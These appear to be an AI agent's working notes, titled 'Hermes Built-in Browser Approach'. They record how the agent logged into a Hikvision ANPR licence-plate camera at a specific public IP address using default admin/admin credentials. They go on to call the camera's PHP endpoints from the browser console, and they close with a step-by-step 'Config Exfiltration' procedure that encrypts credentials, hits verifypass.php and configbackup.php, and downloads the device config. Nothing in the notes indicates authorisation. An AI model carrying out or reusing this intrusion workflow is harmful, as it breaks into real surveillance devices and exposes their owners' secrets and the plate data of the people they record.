# Hermes Built-in Browser Approach

Session evidence: Playwright on Kali VPS failed with driver connection errors
("Connection closed while reading from the driver"), but Hermes's built-in
browser tools logged into the Hikvision ANPR camera trivially.

## Why Playwright Failed on VPS

```
Error: Cannot find module '/usr/share/nodejs/playwright/cli.js'
Exception: Connection.init: Connection closed while reading from the driver
```

Kali's Node.js packaging places playwright's cli.js in a non-standard path.
npx-installed browsers exist at `/home/hermes/.cache/ms-playwright/chromium-*`
but the Python driver can't locate them even with PLAYWRIGHT_BROWSERS_PATH set.
Three separate fix attempts (npx install, env var, symlink) all failed.

## Hermes Browser Flow (Working)

### Step 1: Navigate to login
```
browser_navigate("http://202.184.43.165/login.htm")
→ Empty snapshot initially (page rendering via JS)
```

### Step 2: Wait for JS render, then snapshot
```
browser_snapshot(full=true)
→ Shows login form: "System login", "name" textbox [e2], "Password" textbox [e3],
  "Save password" checkbox [e4], "Login" button text
```

### Step 3: Fill credentials
```
browser_type(ref="e2", text="admin")   → user field
browser_type(ref="e3", text="admin")   → password field
```

### Step 4: Submit
```
browser_press(key="Enter")
→ Snapshot goes empty briefly, then resolves to dashboard:
  "Smart camera for vehicle identification"
  Navigation: Video | Query data | Options | System
  Live ANPR table with columns: Time, Plate, License, Color, Width, etc.
```

### Step 5: API access via browser_console
The browser_console tool can execute fetch() calls to PHP endpoints from
within the authenticated browser context. **Must wrap in async IIFE**:
```javascript
(async () => {
    const r = await fetch("/systemjson.php", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({type: "get_device_info"})
    });
    return await r.text();
})()
```

Plain `await fetch(...)` at top level fails with:
`SyntaxError: await is only valid in async functions and the top level bodies of modules`

## Key Insight

When a target requires JavaScript-based authentication (AES-CTR login,
dynamic form rendering), skip VPS Playwright entirely and use Hermes's
built-in browser tools. They're faster (no SSH round-trip, no driver setup)
and more reliable (cloud-hosted Browserbase vs. local Kali packaging).

## Config Exfiltration via Browser

Same approach extends to full config exfil:
1. Login via browser_navigate → browser_type → browser_press
2. browser_console: call AesCtr.encrypt("admin:admin", "天天", 128)
3. browser_console: POST encrypted value to verifypass.php
4. browser_console: POST config_backup request to configbackup.php
5. Read response.data, download config via browser_navigate to the file URL
